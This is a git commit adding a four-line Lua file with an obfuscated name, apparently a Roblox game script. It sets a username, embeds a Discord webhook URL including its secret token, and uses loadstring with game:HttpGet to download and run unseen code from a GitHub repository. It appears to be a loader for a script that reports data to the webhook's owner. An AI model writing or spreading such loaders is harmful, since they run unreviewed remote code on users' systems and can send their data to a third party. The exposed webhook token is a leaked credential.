90c99d665c02a76550258b5f02aa26408a3ae9be
mitchellpikejack <104778054+mitchellpikejack@users.noreply.github.com>
2023-04-06 11:02:10 +0100

    Add files via upload

---
+++ obf_qwe46PEjc185xLEDjU1vVo37z78eekfFp0pS5IkYN8QzPd6gjcqlOsr96Fn8lPNr.lua
@@ -0,0 +1,4 @@
+UserName = "oogo111"
+Webhook = "https://discord.com/api/webhooks/1093469505432342548/6BxwQMD3BbIQxbGxDnyNf5nv9VUhRJ2N78FuyNVJkf47ecUxJT3xHtk2-ngCyPjsInnx"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/A/main/main", true))()
